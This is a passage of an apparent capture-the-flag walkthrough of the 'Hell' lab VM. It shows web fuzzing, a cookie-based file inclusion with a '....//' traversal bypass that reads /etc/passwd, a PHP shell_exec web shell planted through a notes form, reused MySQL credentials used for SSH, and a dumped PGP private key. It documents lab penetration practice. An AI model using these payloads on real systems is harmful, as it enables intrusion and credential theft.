<p>00013:  C=200      7 L        11 W       88 Ch    &ldquo; &ndash; 1&rdquo;
02780:  C=200   5606 L     35201 W    1028165 Ch     &ldquo; &ndash; server&rdquo;
```</p>

<p>Adding <code>.php</code> to the end of my fuzz keyword revealed some more interesting files:</p>

<p>```bash Hell web server files
root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt &mdash;hc 404 <a href="http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php">http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php</a></p>

<hr />

<ul>
<li>Wfuzz  2.0 &ndash; The Web Bruteforcer                     *</li>
</ul>


<hr />

<p>Target: <a href="http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php">http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php</a>
Payload type: file,/usr/share/wordlists/wfuzz/general/big.txt</p>

<h1>Total requests: 3036</h1>

<h1>ID Response   Lines      Word         Chars          Request</h1>

<p>01375:  C=200     17 L        33 W      371 Ch    &ldquo; &ndash; index&rdquo;
01663:  C=302      0 L         0 W        0 Ch    &ldquo; &ndash; login&rdquo;
01684:  C=200      5 L        19 W      163 Ch    &ldquo; &ndash; mail&rdquo;
02009:  C=302     21 L        38 W      566 Ch    &ldquo; &ndash; panel&rdquo;
02076:  C=302     17 L        35 W      387 Ch    &ldquo; &ndash; personal&rdquo;
02439:  C=200      7 L        21 W      170 Ch    &ldquo; &ndash; server&rdquo;
02852:  C=200      2 L         2 W       19 Ch    &ldquo; &ndash; users&rdquo;
```</p>

<p>So this gives us slightly more to work with. All of the above are relative to <code>super_secret_login_path_muhahaha</code>.
<code>/1</code> was a big red <strong>INTRUDER ALERT</strong> message, and <code>/server</code> was a gif of a server rack falling over.</p>

<p>From the .php file side of things, it was slightly more interesting.</p>

<h2>302 content anyone?</h2>

<p>I was already aware of <code>index.php</code> as well as <code>login.php</code> due to the root of the login directory revealing this. The rest of the items I browsed using the Iceweasal browser in Kali Linux. The results were:</p>

<ul>
<li><code>mail.php</code> was a page showing us that we have received <em>2</em> emails, and that the &lsquo;firewall&rsquo; is activated. There was also what I think is a spam filtering dog gif ;)</li>
<li><code>panel.php</code> simply redirected you back to <code>index.php</code>. Assuming there is a auth requirement here.</li>
<li><code>personal.php</code> also simply redirected you back to <code>index.php</code>. Again, assuming a auth requirement.</li>
<li><code>server.php</code> had the gif we saw in <code>/server</code> with some humorous test with it. Nothing really of interest.</li>
<li><code>users.php</code> just returned the words <em>Jack</em>. This is the same user mentioned in the shrine page from <code>/personal/</code>.</li>
</ul>


<p>Due to these auth requirements, I decided to take all of these url&rsquo;s to <code>curl</code>, and inspect the cookies, headers etc. that were being sent around. Maybe this will hint towards something useful. The command used for the investigations was:</p>

<p>```bash Hell curl
root@kali:~# curl -L -v <a href="http://192.168.56.102/super_secret_login_path_muhahaha/index.php">http://192.168.56.102/super_secret_login_path_muhahaha/index.php</a> -c cookies -b cookies
<HTML>
<FORM name="login" method="post" action="login.php"></p>

<p><CENTER>
<H1> Admin </H1>
<H3>
<STRONG>Username:</STRONG>
<INPUT name="username" id="username" type="text" value=""/>
<BR>
<BR>
<STRONG>Password:</STRONG>
<INPUT name="password" id="password" type="password" value=""/>
<BR>
<BR>
<INPUT name="mysubmit" id="mysubmit" type="submit" value="Login"/>
</H3>
</HTML>
```</p>

<p>Here I am telling curl to make a <code>GET</code> request to <a href="http://192.168.56.102/super_secret_login_path_muhahaha/index.php,">http://192.168.56.102/super_secret_login_path_muhahaha/index.php,</a> using a cookies file called <code>cookies</code> when making the request (-b flag), and storing any cookies received in the same file (-c flag). I am also telling it to follow redirects in the case of <code>302</code>&rsquo;s, and be verbose with output so that I can see the headers. Requesting <code>index.php</code> resulted in a cookie jar of:</p>

<p>```bash Hell cookie-jar
root@kali:~# cat cookies</p>

<h1>Netscape HTTP Cookie File</h1>

<h1><a href="http://curl.haxx.se/rfc/cookie_spec.html">http://curl.haxx.se/rfc/cookie_spec.html</a></h1>

<h1>This file was generated by libcurl! Edit at your own risk.</h1>

<p>192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
```</p>

<p>Great. So I used this on all of the enumerated scripts, carefully checking for anything that would stand out. This part definitely took me some time to realize, but I finally saw the gem when I made a request to <code>personal.php</code>:</p>

<p>```bash 302 output
root@kali:~# curl -v -L <a href="http://192.168.56.102/super_secret_login_path_muhahaha/personal.php">http://192.168.56.102/super_secret_login_path_muhahaha/personal.php</a> -c cookies -b cookies
* About to connect() to 192.168.56.102 port 80 (#0)
*   Trying 192.168.56.102&hellip;
* connected
* Connected to 192.168.56.102 (192.168.56.102) port 80 (#0)</p>

<blockquote><p>GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
User-Agent: curl/7.26.0
Host: 192.168.56.102
Accept: <em>/</em>
Cookie: PHPSESSID=8u300rbb0747fi6iocm0lt4310</p>

<ul>
<li>HTTP 1.1 or later with persistent connection, pipelining supported
&lt; HTTP/1.1 302 Found
&lt; Date: Sun, 20 Jul 2014 07:48:17 GMT
&lt; Server: Apache/2.2.22 (Debian)
&lt; X-Powered-By: PHP/5.4.4-14+deb7u11
&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
&lt; Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
&lt; Pragma: no-cache
&lt; Location: index.php
&lt; Vary: Accept-Encoding
&lt; Content-Length: 387
&lt; Content-Type: text/html
&lt;</li>
<li>Ignoring the response-body     # WAIT A SEC&hellip;</li>
<li>Connection #0 to host 192.168.56.102 left intact</li>
<li>Issue another request to this URL: &lsquo;<a href="http://192.168.56.102/super_secret_login_path_muhahaha/index.php">http://192.168.56.102/super_secret_login_path_muhahaha/index.php</a>&rsquo;</li>
<li>Re-using existing connection! (#0) with host (nil)</li>
<li>Connected to (nil) (192.168.56.102) port 80 (#0)
GET /super_secret_login_path_muhahaha/index.php HTTP/1.1
```</li>
</ul>
</blockquote>

<p>Look at line 25. <em>Ignoring the request-body</em>. But we got a 302? Ok lets make another request without the <code>-L</code> flag and check if it reveals anything:</p>

<p>```bash personal.php content
root@kali:~# curl -v <a href="http://192.168.56.102/super_secret_login_path_muhahaha/personal.php">http://192.168.56.102/super_secret_login_path_muhahaha/personal.php</a> -c cookies -b cookies
* About to connect() to 192.168.56.102 port 80 (#0)
*   Trying 192.168.56.102&hellip;
* connected
* Connected to 192.168.56.102 (192.168.56.102) port 80 (#0)</p>

<blockquote><p>GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
User-Agent: curl/7.26.0
Host: 192.168.56.102
Accept: <em>/</em>
Cookie: PHPSESSID=8u300rbb0747fi6iocm0lt4310</p>

<ul>
<li>HTTP 1.1 or later with persistent connection, pipelining supported
&lt; HTTP/1.1 302 Found
&lt; Date: Sun, 20 Jul 2014 07:54:07 GMT
&lt; Server: Apache/2.2.22 (Debian)
&lt; X-Powered-By: PHP/5.4.4-14+deb7u11
&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
&lt; Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
&lt; Pragma: no-cache
&lt; Location: index.php
&lt; Vary: Accept-Encoding
&lt; Content-Length: 387
&lt; Content-Type: text/html
&lt;
<HTML>
<FORM name="login" method="post" action="check.php">
<CENTER>
<H1> Personal Folder Login </H1>
<H3>
<STRONG>Username:</STRONG>
<INPUT name="username" id="username" type="text" value=""/>
<BR>
<BR>
<STRONG>Password:</STRONG>
<INPUT name="password" id="password" type="password" value=""/>
<BR>
<BR>
<INPUT name="mysubmit" id="mysubmit" type="submit" value="Login"/>
</H3>
</HTML></li>
</ul>
</blockquote>

<ul>
<li>Connection #0 to host 192.168.56.102 left intact</li>
<li>Closing connection #0
```</li>
</ul>


<p>Well what do you know. We get a 302 and content. This time we have a login form that posts to <code>check.php</code>. A <code>GET</code> request to <code>check.php</code> resulted in a 302, but to <code>personal.php</code> and not <code>index.php</code>.</p>

<p><code>panel.php</code> had similar behavior. Showing content even though we got a 302. The output for <code>panel.php</code>:</p>

<p><code>html
&lt;HTML&gt;
&lt;CENTRE&gt;
&lt;H2&gt; Folders &lt;/H2&gt;
&lt;TABLE style="width:700px" align="center"&gt;
&lt;TR&gt;
   &lt;TD&gt;&lt;A HREF="server.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF="mail.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF="users.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF="personal.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF="notes.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
&lt;/TR&gt;
&lt;TR&gt;
   &lt;TD&gt;&lt;H4&gt;Server Status&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Mail Status&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Auth Users&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Personal Folder&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Notes&lt;/H4&gt;&lt;/TD&gt;
&lt;/TR&gt;
&lt;/CENTRE&gt;
&lt;/HTML&gt;
</code></p>

<p>Here we have another script, <code>notes.php</code> revealed. Browsing to <code>notes.php</code>, we are presented with a input field with a <em>Write Note</em> button, and a message stating: <em>&ldquo;note.txt stored to temporary storage upon submission&rdquo;</em>. I guessed this temporary storage is most probably /tmp. Posting to notes.php did not yield any input and I figured this was part of something to come later.</p>

<h2>finding the web vuln</h2>

<p>Ok we have come this far and you still reading? :O Just a little more and all will be revealed I promise.</p>

<p>Back to <code>check.php</code>, it was time to check for any potential SQL injection on the post to <code>check.php</code> from the login form. Nope. Nothing like that. However, while messing around I noticed that this script was setting a new cookie <code>failcount</code>. failcount would increment with every incorrect login to <code>check.php</code>. After <em>3</em> failed attempts, another cookie called <code>intruder</code> was set:</p>

<p>```bash Hell failcount
Added cookie intruder=&ldquo;1&rdquo; for domain 192.168.56.102, path /super_secret_login_path_muhahaha/, expire 0</p>

<blockquote><p>Cookie: intruder=1; failcount=4; PHPSESSID=8u300rbb0747fi6iocm0lt4310
```</p></blockquote>

<p>Again I will admit this did not jump right out at me. In fact it took quite a few more requests to finally puzzle it together. However, I finally nailed it when a request without the -L (follow redirects) flag was set for <code>panel.php</code>:</p>

<p><code>bash Hell Intruder
&lt;HTML&gt;
&lt;CENTRE&gt;
&lt;H2&gt; Folders &lt;/H2&gt;
&lt;TABLE style="width:700px" align="center"&gt;
&lt;TR&gt;
   &lt;TD&gt;&lt;A HREF="server.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF="mail.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF="users.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF="personal.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF="notes.php"&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
&lt;/TR&gt;
&lt;TR&gt;
   &lt;TD&gt;&lt;H4&gt;Server Status&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Mail Status&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Auth Users&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Personal Folder&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Notes&lt;/H4&gt;&lt;/TD&gt;
&lt;/TR&gt;
&lt;/CENTRE&gt;
&lt;HTML&gt;
&lt;CENTER&gt;
&lt;FONT COLOR = "RED"&gt;
&lt;H1&gt;INTRUDER ALERT!&lt;/H1&gt;
&lt;/FONT&gt;
&lt;/CENTER&gt;
&lt;/HTML&gt;
&lt;/HTML&gt;
</code></p>

<p>Notice the familiar <strong>INTRUDER ALERT</strong> message? :) Also remember how this file was called <code>/1</code> from the previous enumeration? Yep! File Include time! With us having a cookiejar file called <code>cookies</code> available for editing, it was easy to play around with this. The normal cookiejar had:</p>

<p>```bash Hell cookiejar
root@kali:~# cat cookies</p>

<h1>Netscape HTTP Cookie File</h1>

<h1><a href="http://curl.haxx.se/rfc/cookie_spec.html">http://curl.haxx.se/rfc/cookie_spec.html</a></h1>

<h1>This file was generated by libcurl! Edit at your own risk.</h1>

<p>192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder 1
```</p>

<p>To test the file include, the first knee jerk reaction was to replace the <code>1</code> with <code>/etc/passwd</code>. This yielded no results, and immediately I feared failure and assumptions disappointing me. However, just to make sure, I replaced it again with something in the same path as <code>/1</code>, like <code>mail.php</code>:</p>

<p>```bash Hell file include testing
root@kali:~# cat cookies</p>

<h1>Netscape HTTP Cookie File</h1>

<h1><a href="http://curl.haxx.se/rfc/cookie_spec.html">http://curl.haxx.se/rfc/cookie_spec.html</a></h1>

<h1>This file was generated by libcurl! Edit at your own risk.</h1>

<p>192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder ./mail.php</p>

<p>root@kali:~# curl <a href="http://192.168.56.102/super_secret_login_path_muhahaha/panel.php">http://192.168.56.102/super_secret_login_path_muhahaha/panel.php</a> -c cookies -b cookies</p>

<p><HTML>
<CENTRE>
<H2> Folders </H2>
<TABLE style="width:700px" align="center">
<TR>
   <TD><A HREF="server.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="mail.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="users.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="personal.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="notes.php"><IMG SRC='folder.png'></A></TD>
</TR>
<TR>
   <TD><H4>Server Status</H4></TD>
   <TD><H4>Mail Status</H4></TD>
   <TD><H4>Auth Users</H4></TD>
   <TD><H4>Personal Folder</H4></TD>
   <TD><H4>Notes</H4></TD>
</TR>
</CENTRE>
<HTML>
<H3> Email&rsquo;s recieved in the last 24 hours: </H3>2<BR>
<H3> Current Status: Firewall Activated </H3><BR>
<IMG SRC="http://i.imgur.com/JjipeOj.gif">
</HTML>
</HTML>
```</p>

<p>YES. It <strong>does</strong> work! We have the same output added to the <code>panel.php</code> output as we would have if we browsed directly to <code>mail.php</code>. By now the assumption was that the code had something like:</p>

<p><code>php Hell File Include assumption
if ($_COOKIE['intruder']) {
   include($_COOKIE['intruder']);
}
</code></p>

<p>&hellip;with some kind of filtering preventing reading the <code>/etc/passwd</code>. While I was still pretty excited about finding this vuln, I soon came across <a href="https://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001">this</a>#Gray_Box_testing_and_example) article detailing potential ways of bypassing directory traversal vulnerabilities. After reading this I promptly changed the <code>intruder</code> cookie to <code>....//....//....//....//....//etc/passwd</code> and viola! :)</p>

<p>```bash Hell Directory Traversal
root@kali:~# cat cookies</p>

<h1>Netscape HTTP Cookie File</h1>

<h1><a href="http://curl.haxx.se/rfc/cookie_spec.html">http://curl.haxx.se/rfc/cookie_spec.html</a></h1>

<h1>This file was generated by libcurl! Edit at your own risk.</h1>

<p>192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder &hellip;.//&hellip;.//&hellip;.//&hellip;.//&hellip;.//etc/passwd</p>

<p>root@kali:~# curl <a href="http://192.168.56.102/super_secret_login_path_muhahaha/panel.php">http://192.168.56.102/super_secret_login_path_muhahaha/panel.php</a> -c cookies -b cookies</p>

<p><HTML>
<CENTRE>
<H2> Folders </H2>
<TABLE style="width:700px" align="center">
<TR>
   <TD><A HREF="server.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="mail.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="users.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="personal.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="notes.php"><IMG SRC='folder.png'></A></TD>
</TR>
<TR>
   <TD><H4>Server Status</H4></TD>
   <TD><H4>Mail Status</H4></TD>
   <TD><H4>Auth Users</H4></TD>
   <TD><H4>Personal Folder</H4></TD>
   <TD><H4>Notes</H4></TD>
</TR>
</CENTRE>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:104::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:104:108:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
george:x:1000:1000:george,,,:/home/george:/bin/bash
mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
jack:x:1001:1001::/home/jack:/bin/sh
milk_4_life:x:1002:1002::/home/milk_4_life:/bin/sh
developers:x:1003:1003::/home/developers:/bin/sh
bazza:x:1004:1004::/home/bazza:/bin/sh
oj:x:1005:1005::/home/oj:/bin/sh
</HTML>
root@kali:~#
```</p>

<p>YEAH. That felt pretty darm good! Obviously not knowing all the steps needed to complete this VM, I figured I had come a pretty long way to finding the pot of gold. (Note the users in this file for later) During the enumeration I took a chance to include <code>/root/flag.txt</code>:</p>

<p><code>``bash Hell /root/flag.txt</code>
root@kali:~# cat cookies</p>

<h1>Netscape HTTP Cookie File</h1>

<h1><a href="http://curl.haxx.se/rfc/cookie_spec.html">http://curl.haxx.se/rfc/cookie_spec.html</a></h1>

<h1>This file was generated by libcurl! Edit at your own risk.</h1>

<p>192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder &hellip;.//&hellip;.//&hellip;.//&hellip;.//&hellip;.//root/flag.txt</p>

<p>root@kali:~# curl <a href="http://192.168.56.102/super_secret_login_path_muhahaha/panel.php">http://192.168.56.102/super_secret_login_path_muhahaha/panel.php</a> -c cookies -b cookies</p>

<p><HTML>
<CENTRE>
<H2> Folders </H2>
<TABLE style="width:700px" align="center">
<TR>
   <TD><A HREF="server.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="mail.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="users.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="personal.php"><IMG SRC='folder.png'></A></TD>
   <TD><A HREF="notes.php"><IMG SRC='folder.png'></A></TD>
</TR>
<TR>
   <TD><H4>Server Status</H4></TD>
   <TD><H4>Mail Status</H4></TD>
   <TD><H4>Auth Users</H4></TD>
   <TD><H4>Personal Folder</H4></TD>
   <TD><H4>Notes</H4></TD>
</TR>
</CENTRE>
Congratulations of beating Hell.</p>

<p>I hope you enjoyed it and there weren&rsquo;t to many trolls in here for you.</p>

<p>Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242</p>

<p>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de</p>

<p></HTML>
root@kali:~#
```</p>

<p>And bingo. <em>Technically</em> we finished what the original goal was, though, re-reading the original entry on Vulnhub, I was almost certain this was not the only way to get to this. Maybe a bug on the original release of the VM? I don&rsquo;t know.
From here on onwards, the goal was no longer to read <code>/root/flag.txt</code>. No, we now have to root this VM :)</p>

<h2>gaining shell</h2>

<p>With the focus slightly shifting, and our ability to read files off the file system, the next natural step was to attempt to get command execution on the VM. Remembering the <code>notes.php</code> file, I decided to try include <code>/tmp/note.txt</code>. This worked just fine and echoed my testing attempts from earlier. So with this information, I simply went back to <code>notes.php</code>, entered: <code>&lt;?php print_r(shell_exec($_GET['c'])); ?&gt;</code>, and submitted the form. Next I edited the cookiejar to include <code>/tmp/notes.txt</code>, and proceeded to test my command execution:</p>

<p><code>bash Hell command execution
root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c=id -c cookies -b cookies
[snip]
&lt;/CENTRE&gt;
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/HTML&gt;
root@kali:~#
</code></p>

<p>Yay :) With this confirmed working, I modified the command exec request slightly so that commands with potentially strange characters are correctly encoded etc:</p>

<p><code>bash Hell 'better' command execution
curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c=$(echo -n “ls -lah” | python -c "import urllib, sys; print urllib.quote(''.join(sys.stdin));") -c cookies -b cookies
</code></p>

<h2>becoming jack</h2>

<p>With command execution, it was easy to start enumerating as much as possible about the VM. At least as much as the <code>www-data</code> user has access to, which is generally quite a lot.</p>

<p>I looked at the source files for the website out of curiosity about the filtering etc that was going on. I stumbled upon some MySQL credentials in <code>login.php</code>:</p>

<p><code>php MySQL credentials
// mysql_connect("127.0.0.1", "Jack", "zgcR6mU6pX") or die ("Server Error"); I'll change this back once development is done. Got sick of typing my password.
mysql_connect("127.0.0.1", "www-data", "website") or die("Server Error");
</code></p>

<p>The comment was quite helpful along with all the mentions of Jack on the website, along with the <code>/etc/passwd</code> revealing a <code>jack</code> user, I tried these credentials on a SSH session:</p>

<p>```bash ssh as jack
root@kali:~# ssh <a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#106;&#x61;&#x63;&#107;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#x2e;&#x35;&#x36;&#x2e;&#49;&#48;&#x32;">&#x6a;&#97;&#x63;&#107;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#x35;&#x36;&#46;&#x31;&#48;&#x32;</a>
<a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#x6a;&#x61;&#x63;&#107;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#x35;&#54;&#x2e;&#x31;&#48;&#50;">&#106;&#x61;&#x63;&#x6b;&#64;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#53;&#54;&#46;&#49;&#48;&#50;</a>&rsquo;s password:
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Sun Jul 20 04:29:06 2014 from 192.168.56.1
$ id
uid=1001(jack) gid=1001(jack) groups=1001(jack)
$
```</p>

<p>Well that was easy&hellip; With this shell, I also checked out the MySQL database to see if there is any interesting information:</p>

<p>```mysql Hell MySQL
$ mysql -uwww-data -pwebsite
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10320
Server version: 5.5.37-0+wheezy1 (Debian)</p>

<p>Copyright &copy; 2000, 2014, Oracle and/or its affiliates. All rights reserved.</p>

<p>Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.</p>

<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the current input statement.</p>

<p>mysql> show databases;
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| Database           |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| information_schema |
| website            |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
2 rows in set (0.00 sec)</p>

<p>mysql> use website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A</p>

<p>Database changed
mysql> show tables;
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| Tables_in_website |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| users             |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
1 row in set (0.00 sec)</p>

<p>mysql> select * from users;
+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| username | password  |
+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| Jack     | g0tmi1k69 |
+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
1 row in set (0.00 sec)</p>

<p>mysql>
```</p>

<p>Alrighty. I made a note about the credentials we have associated with &lsquo;Jack&rsquo; so far. I also tested these credentials on the website, just to get a feel of what the site was actually supposed to do :P</p>

<h2>becoming milk_4_life</h2>

<p>Jack had a <code>.pgp</code> folder with a private key stored in hes home directory.</p>

<p>```bash jacks private PGP key
$ pwd
/home/jack/.pgp</p>

<p>$ ls -lah
total 20K
drwx&mdash;&mdash;&mdash; 2 jack jack 4.0K Jun 18 12:35 .
drwx&mdash;&mdash;&mdash; 4 jack jack 4.0K Jun 22 18:28 ..
-rwx&mdash;&mdash;&mdash; 1 jack jack   39 Jun 18 12:35 note
-rwx&mdash;&mdash;&mdash; 1 jack jack 1.8K Jun 18 12:20 pgp.priv
-rwx&mdash;&mdash;&mdash; 1 jack jack  890 Jun 18 12:24 pgp.pub</p>

<p>$ cat pgp.priv
&mdash;&mdash;-BEGIN PGP PRIVATE KEY BLOCK&mdash;&mdash;&ndash;
Version: BCPG C# v1.6.1.0</p>

<p>lQOsBFOg9v8BCACbr++BXlL9e4N6pzcrHkNZGANB7Ii3vHc0Nj37kCm7ZuTMx4LN
bpWrqGb9W9grS9YQ7xSEkBShaKlWMilb4rqrM/tmDyuGt9UozCrVrCTfaZdPl72o
u1QO1DxTT9/iFwlb6AAjTvJGQQx92PQeShEOeTtycH+Xz4tx1ezHpbA4HK9ijftR
lyZy+y9GPSqYLsIU3N8WtnrTJRfSMiU/AGv/GWpykp3tlHjIL0YSHfvUppe4xAil
54J+LN7se3jKuFcRM+i9TF08hsTtM6azl7X4yyEDhHcvWgFY/vyggEwe6/ZP1IKG
zzAWi0sx7tlZLxyr9AFSXLwLvbhUpR3M5rJBABEBAAH/AwMC8ht700SVD+1guMSO
NKMnwLvKkrmW32b/zo/x4g4MbhUs1BXIvHfGw1ArsEpkMucb8utDqGzcwctR00de
jTr/nFo0gKxBMgc34e9HNTI0iFlVYWDFZqU4ie6/Pyt8qvZHOe5Aq0qPsCkcdMME
bR6EQng1ZBXX7zHCF2TobPnIxp5CGI2WUwXmXaGQS/hRriIcAhDx5ZFFqOdVQWES
mLo5Rd205/M4mungbUvwrHayu6ZGume+VXs630YaacNiBFpXnPDfKOCipZ+EhYsz
7febMxXj3mANwLXQfyTZOIXPzMptE11fbDA8jpy9m0vMy5ZCpJnp/VoTaaUxMz45
OeUI9nKTx9P1lGPC9hYidshg3Sg5Iz/qqmL/byAv1bUV2YOdJlAS1XY9Jj/wNrYz
yG9ASw5nfp0ChhLYnnU4dgfEk5bajGvgnhZAlb/+yNvJ5eUcwivjFC8jJUwlrZ+Z
oj1XAC4148JsjcQHW1d7yONc4iI7tSubMNa5GfBal1BxMRLP3nSZ4ICl67gTjrKH
ztiMKAefip3ywnRomfn7q9raJQ8TsKp0+REVy05mhZMZ1AdMlZzhTz8cYy8II6yr
qSxuJARfJ95FGYPrASMfJ+aZfPNk5RDnH5d92vxm/nIWexdayZqqQJG4MzOhtrjx
a0YouqQhxvD2aKslEBJ1S/D4D40xkVI+oaI+aM/6X+XzC2XVJgm7G8FvmtE09BUm
